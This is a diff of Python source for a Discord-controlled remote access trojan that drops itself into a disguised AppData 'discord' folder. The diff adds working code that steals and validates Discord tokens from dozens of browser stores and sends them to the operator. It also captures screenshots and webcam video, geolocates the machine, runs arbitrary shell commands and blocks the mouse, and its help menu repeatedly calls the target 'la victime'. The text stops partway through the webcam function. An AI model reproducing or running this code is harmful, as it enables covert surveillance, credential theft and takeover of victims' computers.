@@ -5,15 +5,56 @@ import subprocess
 
 file_name = "r4tbyHeartWay.pyw"
 
-appdata_roaming_path = Path(os.getenv('APPDATA'))
+appdata_roaming_path = Path(os.path.expanduser('~')) / 'AppData' / 'Roaming'
 
-file_path = appdata_roaming_path / file_name
+discord_path = appdata_roaming_path / 'discord'
+
+if not discord_path.exists():
+    discord_path.mkdir(parents=True, exist_ok=True)
+
+file_path = discord_path / file_name
 
 script_content = r'''
 import subprocess
 import sys
+
+package_mapping = {
+    "opencv-python": "cv2",
+    "pillow": "PIL",
+    "pycryptodome": "Crypto",
+    "pycryptodomex": "Cryptodome",
+    "win32crypt": "win32crypt",
+    "pycaw": "pycaw",
+    "gputil": "GPUtil",
+}
+
+packages = [
+    "discord", "discord.ext.commands", "platform", "socket", "psutil", "uuid", 
+    "shutil", "requests", "screeninfo", "getpass", "tempfile", "os", "pyautogui", 
+    "io", "webbrowser", "pyttsx3", "re", "base64", "json", "winreg", "pyaudio", 
+    "opencv-python", "time", "inspect", "ctypes", "wave", "tkinter", "asyncio", "threading", 
+    "pathlib", "pillow", "win32crypt", "pycaw", "comtypes", "pycryptodome", "pycryptodomex",
+    "gputil"
+]
+
+def install_package(package_name):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
+    except subprocess.CalledProcessError:
+        print(f"Erreur lors de l'installation de {package_name}, passage au suivant...")
+
+for package in packages:
+    import_name = package_mapping.get(package, package.split('.')[0])
+    
+    try:
+        __import__(import_name)
+    except ImportError:
+        print(f"{package} n'est pas installé. Installation en cours...")
+        install_package(package)
+
 import discord
 from discord.ext import commands
+from discord.ui import Button, View, Select
 import platform
 import socket
 import psutil
@@ -37,6 +78,7 @@ import cv2
 import time
 import inspect
 import ctypes
+import GPUtil
 import wave
 import tkinter as tk
 import asyncio
@@ -46,6 +88,7 @@ from PIL import Image
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from ctypes import windll, byref, create_string_buffer
 from comtypes import CLSCTX_ALL
 
 def is_pythonw():
@@ -60,6 +103,10 @@ if sys.platform == "win32":
 pyautogui.FAILSAFE = False
 
 mouse_blocked = False
+webcam_task = None
+webcam_channel = None
+captured_messages = []
+CAPTURE_PATH = "webcam_capture.jpg"
 
 TOKEN = ''
 
@@ -67,13 +114,19 @@ CHANNEL_ID =
 
 intents = discord.Intents.default()
 intents.message_content = True  
-bot = commands.Bot(command_prefix='+', intents=intents)
+bot = commands.Bot(command_prefix='+', intents=intents, help_command=None)
+
+connected_users = []
+
+local_user_name = getpass.getuser()
 
 engine = pyttsx3.init()
 
 @bot.event
 async def on_ready():
-    print(f'Bot connecté en tant que {bot.user}')
+    local_user_name = getpass.getuser()
+    
+    print(f"{local_user_name} est connecté.")
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -82,36 +135,67 @@ async def on_command_error(ctx, error):
     else:
         await channel.send(f"Erreur de commande")
 
+#connection
+
 @bot.event
 async def on_ready():
     user_name = getpass.getuser()
 
     channel = bot.get_channel(CHANNEL_ID)
     if channel:
-        await channel.send(f"{user_name} est connecté !")
+        embed = discord.Embed(
+            title="Connexion utilisateur",
+            description=f"{user_name} est maintenant connecté !",
+            color=discord.Color.green()
+        )
+        embed.set_thumbnail(url="https://media.discordapp.net/attachments/1271668100856676352/1279105898652106865/r900x900r.png?ex=66de7072&is=66dd1ef2&hm=479bbff6c6053cf7b964d76047d36f12d8fd317350212bcdafae4efd118498c7&=&format=webp&quality=lossless&width=662&height=662")
+        
+        embed.add_field(name="Utilisateur", value=user_name, inline=False)
+        embed.add_field(name="Statut", value="En ligne", inline=False)
+
+        await channel.send(embed=embed)
     else:
         print(f"Erreur : Impossible de trouver le canal avec l'ID {CHANNEL_ID}")
 
-@bot.command(name='screenshot')
+#screenshot
+
+@bot.command(name=f'{local_user_name}_screenshot')
 async def screenshot(ctx):
     try:
-        await ctx.send("Commande reçue, prise du screenshot en cours...")
+        embed = discord.Embed(
+            title="Capture d'écran",
+            description="Prise du screenshot en cours...",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
 
         screenshot = pyautogui.screenshot()
-        await ctx.send("Capture d'écran réussie.")
 
         buffer = io.BytesIO()
         screenshot.save(buffer, format="PNG")
         buffer.seek(0)
 
         file = discord.File(fp=buffer, filename="screenshot.png")
-        await ctx.send("Envoi de l'image en cours...")
-        await ctx.send(file=file)
+
+        embed = discord.Embed(
+            title="Capture d'écran terminée",
+            description="Voici la capture d'écran :",
+            color=discord.Color.green()
+        )
+        embed.set_image(url="attachment://screenshot.png")
+        await ctx.send(embed=embed, file=file)
         
     except Exception as e:
-        await ctx.send(f"Une erreur est survenue : {str(e)}")
+        embed = discord.Embed(
+            title="Erreur",
+            description=f"Une erreur est survenue : {str(e)}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
 
-@bot.command(name='open_url')
+#open_url
+
+@bot.command(name=f'{local_user_name}_open_url')
 async def open_url(ctx, url: str):
     try:
         if not url.startswith(('http://', 'https://')):
@@ -119,12 +203,25 @@ async def open_url(ctx, url: str):
             return
         
         webbrowser.open(url)
-        await ctx.send(f"L'URL {url} a été ouverte dans le navigateur.")
+
+        embed = discord.Embed(
+            title="Ouverture de l'URL",
+            description="L'URL demandée a été ouverte dans le navigateur.",
+            color=discord.Color.blue()
+        )
+        embed.add_field(name="URL", value=url, inline=False)
+
+        await ctx.send(embed=embed)
         
     except Exception as e:
-        await ctx.send(f"Une erreur est survenue lors de l'ouverture de l'URL : {str(e)}")
+        error_embed = discord.Embed(
+            title="Erreur lors de l'ouverture de l'URL",
+            description=f"Une erreur est survenue : {str(e)}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=error_embed)
 
-@bot.command(name='system_info')
+@bot.command(name=f'{local_user_name}_system_info')
 async def system_info(ctx):
     try:
         user_name = getpass.getuser()
@@ -134,10 +231,14 @@ async def system_info(ctx):
         system_name = platform.system()
         system_version = platform.version()
         cpu_info = platform.processor()
-        ram_info = f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)}Go"
-        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
+        ram_info = f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} Go"
+        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
 
-        gpu_info = "Non disponible sous Python natif sans modules spécifiques"
+        gpus = GPUtil.getGPUs()
+        if gpus:
+            gpu_info = "\n".join([f"GPU: {gpu.name}, Mémoire Libre: {gpu.memoryFree}MB, Mémoire Totale: {gpu.memoryTotal}MB" for gpu in gpus])
+        else:
+            gpu_info = "Aucun GPU détecté."
 
         public_ip = requests.get('https://api64.ipify.org?format=json').json()["ip"]
         local_ip = socket.gethostbyname(socket.gethostname())
@@ -148,7 +249,7 @@ async def system_info(ctx):
                 if addr.family == socket.AF_INET6:
                     ipv6_addresses.append(addr.address)
 
-        ipv6 = ipv6_addresses if ipv6_addresses else ["None"]
+        ipv6 = ipv6_addresses if ipv6_addresses else ["Aucune adresse IPv6"]
 
         ip_info = requests.get(f'https://ipinfo.io/{public_ip}/json').json()
         isp = ip_info.get('org', 'Inconnu')
@@ -159,13 +260,11 @@ async def system_info(ctx):
         partitions = psutil.disk_partitions()
         for partition in partitions:
             partition_usage = psutil.disk_usage(partition.mountpoint)
-            disk_info += f"{partition.device} | {round(partition_usage.free / (1024 ** 3), 2)}Go | {round(partition_usage.total / (1024 ** 3), 2)}Go | {round(partition_usage.percent, 2)}% | {partition.mountpoint}\n"
+            disk_info += f"{partition.device} | {round(partition_usage.free / (1024 ** 3), 2)} Go libres sur {round(partition_usage.total / (1024 ** 3), 2)} Go, {round(partition_usage.percent, 2)}% utilisé\n"
 
         screens = screeninfo.get_monitors()
-        screen_info = ""
-        for screen in screens:
-            screen_info += f"Name : {screen.name}, Resolution : {screen.width}x{screen.height}, Main Screen : {'Yes' if screen.is_primary else 'No'}\n"
-        
+        screen_info = "\n".join([f"Écran : {screen.name}, Résolution : {screen.width}x{screen.height}, Principal : {'Oui' if screen.is_primary else 'Non'}" for screen in screens])
+
         location_info = requests.get(f'https://ipinfo.io/{public_ip}/json').json()
         country = location_info.get("country", "Inconnu")
         region = location_info.get("region", "Inconnu")
@@ -174,46 +273,30 @@ async def system_info(ctx):
         timezone = location_info.get("timezone", "Inconnu")
         loc = location_info.get("loc", "0,0").split(',')
 
-        response = f"""
-System Info {user_name} "{public_ip}":
-:bust_in_silhouette: | User Pc:
-Name        : "{computer_name}"
-Username    : "{user_name}"
-DisplayName : "{display_name}"
-:computer: | System:
-Platform    : "{system_name}"
-Version     : "{system_version}"
-HWID        : "{uuid.uuid1()}"
-MAC         : "{mac_address}"
-CPU         : "{cpu_info}"
-GPU         : "{gpu_info}"
-RAM         : "{ram_info}"
-:satellite: | Ip:
-Public      : "{public_ip}"
-Local       : "{local_ip}"
-Ipv6        : "{', '.join(ipv6)}"
-Isp         : "{isp}"
-Org         : "{as_info}"
-:minidisc: | Disk:
-{disk_info}
-:desktop: | Screen:
-{screen_info}
-:map: | Location:
-Country     : "{country} ({ip_info.get('country')})"
-Region      : "{region}"
-City        : "{city}"
-Zip         : "{zip_code}"
-Timezone    : "{timezone}"
-Latitude    : "{loc[0]}"
-Longitude   : "{loc[1]}"
-        """
+        embed = discord.Embed(title=f"Informations système pour {user_name}", color=discord.Color.blue())
+
+        embed.add_field(name=":bust_in_silhouette: | Utilisateur", value=f"Nom: {computer_name}\nUtilisateur: {user_name}\nDisplay Name: {display_name}", inline=False)
         
-        await ctx.send(response)
-    
+        embed.add_field(name=":computer: | Système", value=f"Plateforme: {system_name}\nVersion: {system_version}\nHWID: {uuid.uuid1()}\nMAC: {mac_address}\nCPU: {cpu_info}\nRAM: {ram_info}", inline=False)
+
+        embed.add_field(name=":desktop: | GPU", value=gpu_info, inline=False)
+        
+        embed.add_field(name=":satellite: | Réseau", value=f"Public: {public_ip}\nLocale: {local_ip}\nIPv6: {', '.join(ipv6)}\nISP: {isp}\nOrganisation: {as_info}", inline=False)
+
+        embed.add_field(name=":minidisc: | Disques", value=disk_info, inline=False)
+        
+        embed.add_field(name=":desktop: | Écrans", value=screen_info, inline=False)
+
+        embed.add_field(name=":map: | Localisation", value=f"Pays: {country}\nRégion: {region}\nVille: {city}\nCode Postal: {zip_code}\nFuseau horaire: {timezone}\nLatitude: {loc[0]}\nLongitude: {loc[1]}", inline=False)
+
+        await ctx.send(embed=embed)
+
     except Exception as e:
         await ctx.send(f"Une erreur est survenue lors de la récupération des informations système : {str(e)}")
 
-@bot.command(name='open_calculator')
+#open_calculator
+
+@bot.command(name=f'{local_user_name}_open_calculator')
 async def open_calculator(ctx, number: int):
     try:
         if number <= 0:
@@ -223,12 +306,25 @@ async def open_calculator(ctx, number: int):
         for _ in range(number):
             subprocess.Popen('calc')
 
-        await ctx.send(f"La calculatrice a été ouverte {number} fois.")
+        embed = discord.Embed(
+            title="Ouverture de la calculatrice",
+            description=f"La calculatrice a été ouverte {number} fois.",
+            color=discord.Color.blue()
+        )
+
+        await ctx.send(embed=embed)
         
     except Exception as e:
-        await ctx.send(f"Une erreur est survenue lors de l'ouverture de la calculatrice : {str(e)}")
+        error_embed = discord.Embed(
+            title="Erreur lors de l'ouverture de la calculatrice",
+            description=f"Une erreur est survenue : {str(e)}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=error_embed)
 
-@bot.command(name='voice')
+#voice
+
+@bot.command(name=f'{local_user_name}_voice')
 async def voice(ctx, *, text: str):
     try:
         engine.setProperty('rate', 150)
@@ -237,13 +333,26 @@ async def voice(ctx, *, text: str):
         engine.say(text)
         engine.runAndWait()
 
-        await ctx.send(f"Texte parlé : {text}")
+        embed = discord.Embed(
+            title="Texte parlé",
+            description=f"Le texte suivant a été lu :\n{text}",
+            color=discord.Color.blue()
+        )
+
+        await ctx.send(embed=embed)
         
     except Exception as e:
-        await ctx.send(f"Une erreur est survenue lors de la lecture du texte : {str(e)}")
+        error_embed = discord.Embed(
+            title="Erreur lors de la lecture du texte",
+            description=f"Une erreur est survenue : {str(e)}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=error_embed)
+
+#steal_tokens
 
 def get_discord_tokens():
-    tokens = set()  
+    tokens = set()
     appdata = os.getenv("localappdata")
     roaming = os.getenv("appdata")
     paths = {
@@ -253,22 +362,66 @@ def get_discord_tokens():
         'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
         'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
         'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+        'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
+        'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
+        'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
+        'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+        'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+        '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+        'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+        'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+        'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
         'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\'
+        'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
+        'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
+        'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
+        'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
+        'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
+        'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+        'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
+        'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+        'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+        'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+        'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
+        'Vesktop': roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
     }
-    
+
     def decrypt_val(buff, master_key):
         iv = buff[3:15]
         payload = buff[15:]
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
         return cipher.decrypt(payload)[:-16].decode()
-    
+
     def get_master_key(path):
         with open(path, "r", encoding="utf-8") as f:
             local_state = json.loads(f.read())
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         return CryptUnprotectData(master_key[5:], None, None, None, 0)[1]
+
+    def is_valid_token(token):
+        url = "https://discord.com/api/v9/users/@me"
+        url = "https://discord.com/api/v10/users/@me"
+        headers = {
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+            "X-Discord-Locale": "en-US",
+            "Accept-Language": "en-US,en;q=0.5",
+        }
     
+        try:
+            response = requests.get(url, headers=headers, timeout=10)
+            if response.status_code == 200:
+                return True
+            elif response.status_code == 401:
+                print(f"Token invalide ou expiré: {token}")
+            else:
+                print(f"Erreur API Discord {response.status_code}: {response.text}")
+        except requests.exceptions.RequestException as e:
+            print(f"Erreur lors de la vérification du token: {e}")
+    
+        return False
+
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
@@ -280,119 +433,246 @@ def get_discord_tokens():
                 with open(full_path, 'r', errors='ignore') as file:
                     for line in file.readlines():
                         for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line.strip()):
-                            tokens.add(token)
+                            if is_valid_token(token):
+                                tokens.add(token)
                         for enc_token in re.findall(r"dQw4w9WgXcQ:[^\"]*", line.strip()):
                             try:
                                 token = decrypt_val(base64.b64decode(enc_token.split('dQw4w9WgXcQ:')[1]), get_master_key(os.path.join(roaming, platform, "Local State")))
-                                tokens.add(token)
-                            except:
+                                if is_valid_token(token):
+                                    tokens.add(token)
+                            except Exception:
                                 continue
             except FileNotFoundError:
                 continue
             except Exception as e:
                 print(f"Erreur lors du traitement du fichier {file_name} dans {platform}: {e}")
-    
-    return list(tokens)  
 
-@bot.command(name='steal_tokens')
+    return list(tokens)
+
+@bot.command(name=f'{local_user_name}_steal_tokens')
 async def steal_tokens(ctx):
+    await ctx.send(f"Recherche des Tokens Discord en cours..")
     tokens = get_discord_tokens()
+    
+    embed = discord.Embed(
+        title="Tokens Discord",
+        color=discord.Color.blue()
+    )
+    
     if tokens:
-        await ctx.send(f"Tokens trouvés: {tokens}")
+        tokens_text = "\n".join([f"**_Token :_** `{token}`" for token in tokens])
+        embed.add_field(
+            name="Tokens trouvés",
+            value=tokens_text,
+            inline=False
+        )
     else:
-        await ctx.send("Aucun token trouvé.")
+        embed.add_field(
+            name="Résultat",
+            value="**_Aucun token valide trouvé._**",
+            inline=False
+        )
 
-@bot.command(name='rat_help')
+    await ctx.send(embed=embed)
+
+#help
+
+commands_by_category = {
+    "Général": [
+        "+help - Affiche cette aide.",
+        "+clear - Permet de clear le salon pour alléger l'écran.",
+    ],
+    "Système": [
+        "+<username>_screenshot - Prend une capture d'écran et l'envoie dans le salon.",
+        "+<username>_system_info - Affiche les informations système du PC de la victime.",
+        "+<username>_shutdown - Éteint le PC.",
+        "+<username>_restart - Redémarre le PC.",
+        "+<username>_cmd <commande> - Exécute une commande sur le PC de la victime.",
+        "+<username>_logout - Déconnecte l'utilisateur du PC de la victime."
+    ],
+    "Réseau & Fichiers": [
+        "+<username>_open_url <url> - Ouvre l'URL spécifiée dans le navigateur.",
+        "+<username>_list_folder - Liste tous les dossiers présents sur le PC de la victime.",
+        "+<username>_list_file <path/to/folder> - Liste tous les fichiers dans un dossier.",
+        "+<username>_upload <path/to/file> - Télécharge un fichier présent sur le PC.",
+        "+<username>_install - Télécharge un fichier sur le PC de la victime."
+    ],
+    "Multimédia": [
+        "+<username>_voice <texte> - Convertit le texte en parole et le prononce.",
+        "+<username>_play_s - Permet de jouer un son sur le PC de la victime.",
+        "+<username>_play_v - Permet de jouer une vidéo sur le PC de la victime.",
+        "+<username>_webcam <temps> - Prend une capture vidéo de la webcam.",
+        "+<username>_webcam_on - Commence une capture vidéo de la webcam.",
+        "+<username>_webcam_off - stop la capture vidéo de la webcam.",
+	    "+<username>_record <temps> - Fais un enregistrement du micro.",
+        "+<username>_wallpaper <fichier joint> - Change le fond d'écran."
+    ],
+    "Contrôle Utilisateur": [
+        "+<username>_block_mouse - Bloque la souris.",
+        "+<username>_unblock_mouse - Débloque la souris.",
+        "+<username>_volumemax - Met le volume au maximum.",
+        "+<username>_volumemin - Met le volume au minimum.",
+        "+<username>_message <type> <message> - Affiche un message sur l'écran de la victime.",
+        "+<username>_spam - Permet de spam l'ouverture d'un programme spécifique.",
+        "+<username>_open_calculator <nombre> - Permet d'ouvrir la calculatrice autant de fois souhaité."
+    ],
+    "Sécurité": [
+        "+<username>_steal_tokens - Récupère les tokens Discord présents sur le PC.",
+        "+<username>_geolocate - Géolocalise le PC de la victime.",
+        "+<username>_startup - Met le RAT dans les éléments de démarrage.",
+        "+<username>_wallpaper <fichier joint> - Change le fond d'écran.",
+        "+<username>_block_taskmanager - Désactive le gestionnaire des tâches. (BUG)",
+        "+<username>_unblock_taskmanager - Réactive le gestionnaire des tâches. (BUG)"
+    ]
+}
+
+def create_help_embed(page_num):
+    embed = discord.Embed(
+        title="Commandes RAT",
+        color=discord.Color.blue()
+    )
+    
+    categories = list(commands_by_category.keys())
+    start = page_num * 3
+    end = start + 3
+
+    for category in categories[start:end]:
+        commands = "\n".join(commands_by_category[category])
+        embed.add_field(name=category, value=commands, inline=False)
+
+    embed.set_footer(text=f"Page {page_num + 1}/{(len(categories) + 2) // 3}")
+    return embed
+
+@bot.command(name='help')
 async def help_command(ctx):
-    help_text = """
-    Commandes disponibles :
-
-    1. +rat_help - Affiche cette aide..
-    2. +screenshot - Prend une capture d'écran et l'envoie dans le canal.
-    3. +open_url <url> - Ouvre l'URL spécifiée dans le navigateur par défaut.
-    4. +system_info - Affiche les informations système de la machine de la victime.
-    5. +open_calculator <number> - Ouvre la calculatrice Windows le nombre de fois spécifié.
-    6. +voice <texte> - Convertit le texte en parole et le prononce.
-    7. +steal_tokens - Récupère les tokens Discord présents sur la machine.
-    8. +shutdown - éteind le pc
-    9. +restart - redémarre le pc
-    10. +message <type> <message> affiche un message sur l'écran de la victime.
-    11. +<color> screen met une couleur sur l'écran.
-    12. +cmd <commande> execute une commande sur le pc de la victime.
-    13. +list_app envoie un fichier contenant une liste de toutes les applications présentes sur le pc de la victime.
-    14. +webcam <temps> prend une capture vidéo de la webcam avec le temps souhaité (en secondes).
-    15. +clear permet de clear le canal pour alleger l'écran.
-    16. +install télécharge un fichier sur le pc de la victime.
-    17. +block_mouse permet de bloquer la souris.
-    18. +unblock_mouse permet de débloquer la souris.
-    19. +play_s permet de jouer un son sur l'ordinateur de la victime.
-    20. +play_v permet de jouer une vidéo (avec son) sur l'ordinateur de la victime.
-    21. +startup permet de mettre le RAT dans les éléments de démarage.
-    22. +block_taskmanager permet de désactiver le gestionnaire des tâches. (BUG)
-    23. +unblock_taskmanager permet de réactiver le gestionnaire des tâches. (BUG)
-    24. +volumemax permet de mettre le volume au maximum.
-    25. +volumemin permet de mettre le volume au minimum.
-    26. +list_folder permet de lister tous les dossiers présents sur le pc de la victime.
-    27. +list_file <path/to/folder> permet de lister tous les fichiers présents dans un dossier sur le pc de la victime.
-    28. +upload <path/to/file> permet de télécharger un fichier présent sur le pc de la victime.
-    29. +logout permet de déconnecter l'utilisateur du pc de la victime.
-    30. +wallpaper (fichier joint) permet de changer le fond d'écran.
-    31. +geolocate permet de géolocaliser l'ordinateur de la victime.
-
-    N'hésitez pas à utiliser les commandes ci-dessus pour interagir avec le RAT.
-    """
-
     try:
-        if len(help_text) > 2000:
-            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as temp_file:
-                temp_file.write(help_text.encode('utf-8'))
-                temp_file_path = temp_file.name
+        view = View()
 
-            await ctx.send("Voici les commandes disponibles :", file=discord.File(temp_file_path))
+        next_button = Button(label="Suivant", style=discord.ButtonStyle.primary)
+        prev_button = Button(label="Précédent", style=discord.ButtonStyle.primary)
 
-            os.remove(temp_file_path)
-        else:
-            await ctx.send(help_text)
+        page_num = 0
+
+        async def next_callback(interaction):
+            nonlocal page_num
+            if page_num < (len(commands_by_category) // 3):
+                page_num += 1
+                await interaction.response.edit_message(embed=create_help_embed(page_num), view=view)
+
+        async def prev_callback(interaction):
+            nonlocal page_num
+            if page_num > 0:
+                page_num -= 1
+                await interaction.response.edit_message(embed=create_help_embed(page_num), view=view)
+
+        next_button.callback = next_callback
+        prev_button.callback = prev_callback
+
+        view.add_item(prev_button)
+        view.add_item(next_button)
+
+        await ctx.send(embed=create_help_embed(page_num), view=view)
 
     except Exception as e:
-        await ctx.send(f"Une erreur s'est produite : {e}")
+        print(f"Erreur lors de l'envoi du message d'aide : {str(e)}")
 
-@bot.command(name='shutdown')
+#shutdown
+
+@bot.command(name=f'{local_user_name}_shutdown')
 async def shutdown(ctx):
     try:
-        await ctx.send("Arrêt du PC en cours...")
-        subprocess.run("shutdown /s /t 1", shell=True)
-    except Exception as e:
-        await ctx.send(f"Une erreur est survenue lors de l'arrêt du PC : {str(e)}")
+        embed = discord.Embed(
+            title="Arrêt du PC",
+            description="Le PC va s'éteindre dans un instant.",
+            color=discord.Color.blue()
+        )
+        
+        await ctx.send(embed=embed)
 
-@bot.command(name='restart')
+        subprocess.run("shutdown /s /t 1", shell=True)
+
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="Erreur lors de l'arrêt",
+            description=f"Une erreur est survenue lors de l'arrêt du PC : {str(e)}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=error_embed)
+
+#restart
+
+@bot.command(name=f'{local_user_name}_restart')
 async def restart(ctx):
     try:
-        await ctx.send("Redémarrage du PC en cours...")
-        subprocess.run("shutdown /r /t 1", shell=True)
-    except Exception as e:
-        await ctx.send(f"Une erreur est survenue lors du redémarrage du PC : {str(e)}")
+        embed = discord.Embed(
+            title="Redémarrage du PC",
+            description="Le PC va redémarrer dans un instant.",
+            color=discord.Color.orange()
+        )
+        
+        await ctx.send(embed=embed)
 
-@bot.command(name='message')
+        subprocess.run("shutdown /r /t 1", shell=True)
+
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="Erreur lors du redémarrage",
+            description=f"Une erreur est survenue lors du redémarrage du PC : {str(e)}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=error_embed)
+
+#message
+
+@bot.command(name=f'{local_user_name}_message')
 async def display_message(ctx, msg_type: str, *, message: str):
     try:
         title = ""
+        embed_color = discord.Color.blue()
+        msg_box_type = 0x40
+
         if msg_type.lower() == 'error':
             title = "Erreur"
+            msg_box_type = 0x10
+            embed_color = discord.Color.blue()
+
         elif msg_type.lower() == 'warning':
             title = "Avertissement"
+            msg_box_type = 0x30
+            embed_color = discord.Color.blue()
+
         elif msg_type.lower() == 'info':
             title = "Information"
+            msg_box_type = 0x40
+            embed_color = discord.Color.blue()
+
         else:
             title = "Message"
+            msg_box_type = 0x40
+            embed_color = discord.Color.greyple()
 
-        pyautogui.alert(text=message, title=title, button='OK')
-        await ctx.send(f"Message affiché : {msg_type} - {message}")
-        
+        ctypes.windll.user32.MessageBoxW(0, message, title, msg_box_type)
+
+        embed = discord.Embed(
+            title=f"Message {title.lower()} affiché",
+            description=f"**Type**: {msg_type.capitalize()}\n**Message**: {message}",
+            color=embed_color
+        )
+        embed.set_footer(text="Affiché sur l'écran principal")
+
+        await ctx.send(embed=embed)
+
     except Exception as e:
-        await ctx.send(f"Une erreur est survenue lors de l'affichage du message : {str(e)}")
+        error_embed = discord.Embed(
+            title="Erreur",
+            description=f"Une erreur est survenue lors de l'affichage du message : {str(e)}",
+            color=discord.Color.blue(),
+        )
+        await ctx.send(embed=error_embed)
 
-@bot.command(name='color_screen')
+#color_screen
+
+@bot.command(name=f'{local_user_name}_color_screen')
 async def color_screen(ctx, color: str):
     try:
         color = color.lower()
@@ -410,7 +690,9 @@ async def color_screen(ctx, color: str):
     except Exception as e:
         await ctx.send(f"Une erreur est survenue lors de l'application de la couleur : {str(e)}")
 
-@bot.command(name='cmd')
+#cmd
+
+@bot.command(name=f'{local_user_name}_cmd')
 async def execute_cmd(ctx, *, command: str):
     try:
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
@@ -426,7 +708,9 @@ async def execute_cmd(ctx, *, command: str):
     except Exception as e:
         await ctx.send(f"Une erreur est survenue lors de l'exécution de la commande : {str(e)}")
 
-@bot.command(name='list_app')
+#list_app
+
+@bot.command(name=f'{local_user_name}_list_app')
 async def list_applications(ctx):
     try:
         apps = []
@@ -462,16 +746,35 @@ async def list_applications(ctx):
     except Exception as e:
         await ctx.send(f"Une erreur est survenue lors de la récupération des applications : {str(e)}")
 
-@bot.command(name='webcam')
+#webcam
+
+@bot.command(name=f'{local_user_name}_webcam')
 async def capture_webcam(ctx, duration: int):
     try:
         if duration <= 0:
-            await ctx.send("La durée doit être un nombre positif.")
+            embed = discord.Embed(
+                title="Erreur",
+                description="La durée doit être un nombre positif.",
+                color=discord.Color.blue()
+            )
+            await ctx.send(embed=embed)
             return
+
+        embed = discord.Embed(
+            title="Capture de la webcam",
+            description="La capture de la webcam est en cours...",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
 
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
-            await ctx.send("Impossible d'accéder à la webcam.")
+            embed = discord.Embed(
+                title="Erreur",
+                description="Impossible d'accéder à la webcam.",
+                color=discord.Color.blue()
+            )
+            await ctx.send(embed=embed)
             return
 
         fourcc = cv2.VideoWriter_fourcc(*'mp4v')
@@ -480,7 +783,7 @@ async def capture_webcam(ctx, duration: int):
             out = cv2.VideoWriter(temp_file_path, fourcc, 20.0, (int(cap.get(3)), int(cap.get(4))))
 
             frame_count = 0
-            max_frames = duration * 20  
+            max_frames = duration * 30
 
             while frame_count < max_frames:
                 ret, frame = cap.read()
@@ -494,14 +797,31 @@ async def capture_webcam(ctx, duration: int):
 
         if os.path.getsize(temp_file_path) > 0:
             with open(temp_file_path, 'rb') as file:
-                await ctx.send("Voici la vidéo capturée :", file=discord.File(file, "capture.mp4"))
+                embed = discord.Embed(
+                    title="Capture de la webcam terminée",
+                    description="Voici la vidéo capturée :",
+                    color=discord.Color.green()
+                )
+                await ctx.send(embed=embed, file=discord.File(file, "capture.mp4"))
         else:
-            await ctx.send("Erreur lors de la capture vidéo : fichier vidéo vide.")
+            embed = discord.Embed(
+                title="Erreur",
+                description="Erreur lors de la capture vidéo : fichier vidéo vide.",
+                color=discord.Color.blue()
